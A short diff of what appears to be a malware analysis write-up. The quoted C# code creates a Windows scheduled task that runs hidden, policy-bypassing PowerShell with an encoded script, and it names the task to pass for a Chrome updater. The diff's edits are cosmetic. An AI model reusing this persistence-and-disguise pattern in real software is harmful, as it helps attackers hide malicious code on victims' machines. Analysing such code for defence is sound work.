@@ -358,7 +358,7 @@ TaskDefinition td = ts.NewTask();
 
 td.Actions.Add<ExecAction>(new ExecAction("cmd", "/c start /min \"\" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E " + script, null));
 
-You can see here that a dictionary is used to generate a list of unique task names.
+# You can see here that a dictionary is used to generate a list of unique task names.
 
 string[] namesDict = new string[]
 		{
@@ -370,7 +370,7 @@ string[] namesDict = new string[]
 			"Updater"
 		};	
 int nameIndex = new Random().Next(namesDict.Length);
-string taskName = "Chrome" + namesDict[nameIndex];
+string taskName = "Chrome" + namesDict[nameIndex]; 
 ```
 
 ### Creation of task
